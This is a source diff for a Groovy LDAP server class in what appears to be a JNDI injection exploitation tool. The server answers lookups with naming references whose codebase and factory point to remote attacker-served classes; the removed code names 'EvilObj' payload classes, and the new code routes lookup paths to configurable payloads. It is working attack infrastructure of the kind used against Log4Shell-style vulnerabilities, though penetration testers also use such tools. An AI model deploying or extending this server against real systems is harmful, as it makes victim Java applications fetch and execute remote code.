@@ -1,6 +1,8 @@
 package com.jndi.server
 
-
+import com.jndi.utils.JndiMapping
+import com.jndi.controller.JndiController
+import com.jndi.entity.Jndi
 import com.jndi.server.impl.JNDIServer
 import com.unboundid.ldap.listener.InMemoryDirectoryServer
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig
@@ -21,9 +23,6 @@ import javax.net.ssl.SSLSocketFactory
 @Slf4j
 class LDAPServer extends InMemoryOperationInterceptor implements JNDIServer {
 
-    @Value('${server.port}')
-    Integer httpPort
-
     @Value('${jndi.ip}')
     String ip
 
@@ -32,6 +31,9 @@ class LDAPServer extends InMemoryOperationInterceptor implements JNDIServer {
 
     @Value('${jndi.ldap.base}')
     String base
+
+    @Autowired
+    JndiController jndiController
 
     @Override
     void run(String... args) throws Exception {
@@ -53,33 +55,29 @@ class LDAPServer extends InMemoryOperationInterceptor implements JNDIServer {
     void processSearchResult(InMemoryInterceptedSearchResult result){
         def base = result.getRequest().getBaseDN()
         def index = base.indexOf('#')
-        def path = ''
+        def path
         if (index != -1){
             path = base.substring(0, index)
         } else {
             path = base
         }
         def e = new Entry(base)
-        def url = "http://${ip}:${httpPort}/"
-        def className
-        switch (path){
-            case 'evil':
-                className = 'com.jndi.template.EvilObj'
-                break
-            case 'base':
-                className = 'com.jndi.entity.EvilObj'
-                break
-            default:
-                className = 'com.jndi.template.NullObj'
-                break
+        def method = jndiController.getClass().getDeclaredMethod(path)
+        def jndi
+        if(method && method.isAnnotationPresent(JndiMapping.class)){
+            jndi = method.invoke(jndiController, null) as Jndi
+        } else {
+            jndi = jndiController.hello()
         }
-        e.addAttribute('javaClassName', 'evilObj')
-        e.addAttribute('javaCodeBase', url)
+        def factoryLocation = jndi.factoryLocation
+        def factory = jndi.factory
+        e.addAttribute('javaClassName', jndi.className)
+        e.addAttribute('javaCodeBase', factoryLocation)
         e.addAttribute('objectClass', 'javaNamingReference')
-        e.addAttribute('javaFactory', className)
+        e.addAttribute('javaFactory', factory)
         result.sendSearchEntry(e)
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS))
-        log.info("LDAP ${base} ${url}${className}")
+        log.info("LDAP ${base} ${factoryLocation}${factory}")
     }
 
 }
